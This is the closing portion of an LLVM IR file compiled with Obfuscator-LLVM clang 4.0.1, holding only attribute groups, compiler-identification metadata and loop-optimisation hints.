attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind }
attributes #6 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{!5}
!5 = distinct !{!5, !6}
!6 = distinct !{!6, !"LVerDomain"}
!7 = !{!8}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !10}
!10 = !{!"llvm.loop.unroll.disable"}
!11 = distinct !{!11, !2, !3}
!12 = distinct !{!12, !2, !3}
!13 = !{i32 -2146594516}
!14 = !{i32 -2146593131}
!15 = !{i32 -2146592376}
!16 = !{i32 -2146591549}
!17 = distinct !{!17, !2, !3}
!18 = distinct !{!18, !19, !2, !3}
!19 = !{!"llvm.loop.unroll.runtime.disable"}
!20 = !{i32 -2146590728}
!21 = !{i32 -2146589713}
